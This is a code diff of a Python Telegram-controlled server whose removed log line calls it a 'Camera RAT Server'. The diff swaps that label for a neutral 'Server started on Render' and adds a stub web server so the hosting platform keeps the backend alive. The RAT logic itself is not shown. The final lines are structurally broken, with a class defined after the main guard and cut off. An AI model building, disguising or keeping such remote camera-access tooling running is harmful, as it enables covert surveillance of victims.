@@ -95,19 +95,16 @@ def handle_command(chat_id, text):
 
 def main():
     log("=" * 40)
-    log("Camera RAT Server запущен на VDS")
+    log("Сервер запущен на Render")
     log(f"Chat ID: {CHAT_ID}")
     log("=" * 40)
     log("Ожидание команд в Telegram...")
     
     last_update_id = 0
     
-    # Проверяем, что бот отвечает
-    test = send_message(CHAT_ID, f"🟢 Сервер запущен на VDS в {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-    if test:
-        log("✅ Telegram работает, тестовое сообщение отправлено")
-    else:
-        log("❌ Ошибка: не удалось отправить сообщение. Проверь токен!")
+    # Мы убрали жесткую блокирующую проверку, чтобы скрипт не падал при старте.
+    # Вместо этого просто пишем лог.
+    log("✅ Инициализация успешна, переходим к опросу Telegram...")
     
     while True:
         try:
@@ -138,13 +135,32 @@ def main():
         
         except KeyboardInterrupt:
             log("\n👋 Остановлен")
-            send_message(CHAT_ID, "🔴 Сервер остановлен")
             break
         except Exception as e:
-            log(f"Ошибка: {e}")
+            log(f"Ошибка в цикле обновлений: {e}")
             time.sleep(5)
 
+# Добавляем веб-сервер «заглушку» для Render, чтобы сервис не отключался
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import threading
+
+class RenderHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/plain; charset=utf-8")
+        self.end_headers()
+        self.wfile.write("Бот-сервер работает!".encode("utf-8"))
+
+def run_health_check_server():
+    port = int(os.environ.get("PORT", 10000))
+    server = HTTPServer(("0.0.0.0", port), RenderHandler)
+    server.serve_forever()
+
 if __name__ == "__main__":
+    # Запускаем веб-порт в отдельном потоке для проверки от Render
+    threading.Thread(target=run_health_check_server, daemon=True).start()
+    
+    # Запускаем основную логику бота
     main()
     # Класс-заглушка для Render, чтобы он видел рабочий веб-порт
 class WebStub(BaseHTTPRequestHandler):
